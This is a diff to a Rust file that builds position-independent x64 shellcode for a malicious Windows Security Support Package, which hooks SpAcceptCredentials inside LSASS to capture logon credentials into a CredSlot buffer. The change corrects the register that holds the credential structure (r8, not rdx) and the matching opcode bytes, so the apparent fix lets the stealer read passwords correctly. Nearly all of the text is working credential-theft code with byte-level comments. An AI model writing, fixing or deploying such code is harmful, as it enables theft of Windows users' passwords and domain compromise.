@@ -403,9 +403,10 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     //  SpAcceptCredentials (~0x040) — credential capture
     //
     //  Windows x64 calling convention:
-    //    rcx = LogonType  (unused)
-    //    rdx = PSECPKG_PRIMARY_CREDENTIALS (credential struct)
-    //    r8  = Supplemental credentials (unused)
+    //    rcx = PLSA_CLIENT_REQUEST  (unused)
+    //    rdx = SECURITY_LOGON_TYPE  (unused)
+    //    r8  = PSECPKG_PRIMARY_CREDENTIALS (credential struct)
+    //    r9  = Supplemental credentials (unused)
     //
     //  V3-01 fix: LSA passes PSECPKG_PRIMARY_CREDENTIALS (with S),
     //  which contains *pointers* to UNICODE_STRING, not embedded
@@ -431,7 +432,7 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     //  Register allocation:
     //    r15 = position-independent anchor (address of pop-r15)
     //    r14 = mapped section base (from stored base address)
-    //    r13 = credential struct pointer (from rdx)
+    //    r13 = credential struct pointer (from r8)
     //    r12 = temp (UNICODE_STRING pointer / buffer pointer)
     //    rbx = CredSlot base
     //    rsi/rdi = copy source/dest (for rep movsb)
@@ -451,7 +452,7 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0x41, 0x57]);                   // push r15
     blob.extend_from_slice(&[0x48, 0x81, 0xEC]);             // sub rsp, 0x28
     blob.extend_from_slice(&0x28u32.to_le_bytes());
-    blob.extend_from_slice(&[0x49, 0x89, 0xD5]);             // mov r13, rdx  (2nd param)
+    blob.extend_from_slice(&[0x4D, 0x89, 0xC5]);             // mov r13, r8   (3rd param — PSECPKG_PRIMARY_CREDENTIALS)
     // Get position-independent anchor: call $+5; pop r15
     blob.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
     blob.extend_from_slice(&[0x41, 0x5F]);                   // pop r15
